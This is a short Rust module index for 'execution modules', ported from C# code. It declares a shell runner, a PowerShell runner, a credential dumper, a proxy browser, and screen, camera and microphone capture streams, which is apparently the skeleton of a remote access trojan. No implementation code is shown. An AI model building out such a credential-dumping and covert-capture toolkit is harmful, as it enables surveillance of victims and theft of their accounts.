//! Execution modules — shell, file ops, PowerShell, screen, camera, mic, proxy.
//! Port of Modules/Execution/*.cs

mod shell_cmd;
mod file_ops;
mod power_shell;
mod cred_dump;
mod proxy_browser;
mod screen_capture;
mod camera_capture;
mod mic_capture;
pub mod diff_codec;

pub use shell_cmd::ShellCommand;
pub use file_ops::FileOps;
pub use power_shell::PowerShellRunner;
pub use cred_dump::CredentialDumper;
pub use proxy_browser::ProxyBrowser;
pub use screen_capture::{ScreenCapture, ScreenStream, ScreenFrame};
pub use camera_capture::{CameraCapture, CameraStream, CameraFrame};
pub use mic_capture::MicCapture;
